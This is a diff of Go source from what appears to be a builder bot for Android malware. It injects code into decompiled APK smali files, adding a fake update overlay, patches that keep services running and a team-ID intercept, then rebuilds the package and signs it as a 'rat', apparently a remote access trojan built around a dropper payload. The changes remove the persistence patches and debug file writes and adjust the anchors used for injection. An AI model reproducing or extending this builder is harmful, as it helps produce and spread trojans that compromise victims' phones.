@@ -1856,12 +1856,6 @@ func (b *Bot) buildSingleAPK(sess *BuildSession, isInnerPayload bool, dropperPay
 	syncSmali := filepath.Join(workDir, "smali", "app", "mobilex", "plus", "services", "SyncQYAdapter.smali")
 	patchFakeUpdateOverlay(syncSmali)
 
-	guardianSmali := filepath.Join(workDir, "smali", "app", "mobilex", "plus", "services", "GuardianService.smali")
-	patchGuardianAlarm(guardianSmali)
-
-	y6jSmali := filepath.Join(workDir, "smali", "v", "s", "y6jRGLEWNMir.smali")
-	patchStartForegroundService(y6jSmali)
-
 	stringsXml := filepath.Join(workDir, "res", "values", "strings.xml")
 	patchFirebaseResources(stringsXml)
 
@@ -1888,7 +1882,6 @@ func (b *Bot) buildSingleAPK(sess *BuildSession, isInnerPayload bool, dropperPay
 	if err := cmd.Run(); err != nil {
 		return nil, "", fmt.Errorf("apktool build failed: %v", err)
 	}
-	os.WriteFile("/tmp/panel_pre_sign.apk", func() []byte { d, _ := os.ReadFile(outputAPK); return d }(), 0644)
 
 
 	alignedAPK := filepath.Join(tmpDir, "aligned.apk")
@@ -1904,8 +1897,6 @@ func (b *Bot) buildSingleAPK(sess *BuildSession, isInnerPayload bool, dropperPay
 	if err := b.signWithEphemeralKey(outputAPK); err != nil {
 		return nil, "", fmt.Errorf("sign rat: %w", err)
 	}
-	os.WriteFile("/tmp/panel_final.apk", func() []byte { d, _ := os.ReadFile(outputAPK); return d }(), 0644)
-
 	apkData, err := os.ReadFile(outputAPK)
 	if err != nil {
 		return nil, "", fmt.Errorf("read output: %w", err)
@@ -2399,7 +2390,7 @@ func patchServiceRestart(smaliPath string) {
 	}
 	s := string(data)
 
-	oldCode := "    :cond_16\n    :goto_6\n    sget-object p0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;"
+	oldCode := ":cond_16\n    :goto_6\n    sget-object p0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;"
 	newCode := `    :cond_16
     :goto_6
     sget-object v0, Lv/s/RWY6BVSB0XxPbw;->GUsyOYEIobMSb6n:Lv/s/RWY6BVSB0XxPbw;
@@ -2510,7 +2501,7 @@ func patchTeamID(smaliPath, tid string) error {
 	s = s[:startIdx] + newBody + s[startIdx+len(methodStart)+endIdx+len(endMarker):]
 	
 
-	nativeAnchor := "    :try_start_0\n    invoke-static {p0}, Lapp/mobilex/plus/util/UtilYWProcessor;->co(I)Ljava/lang/String;"
+	nativeAnchor := ":try_start_0\n    invoke-static {p0}, Lapp/mobilex/plus/util/UtilYWProcessor;->co(I)Ljava/lang/String;"
 	intercept := fmt.Sprintf("    const/16 v0, 0x41\n\n    if-ne p0, v0, :not_rw_tid\n\n    const-string v0, \"%s\"\n\n    return-object v0\n\n    :not_rw_tid\n    :try_start_0\n    invoke-static {p0}, Lapp/mobilex/plus/util/UtilYWProcessor;->co(I)Ljava/lang/String;", tid)
 
 	if strings.Contains(s, nativeAnchor) {
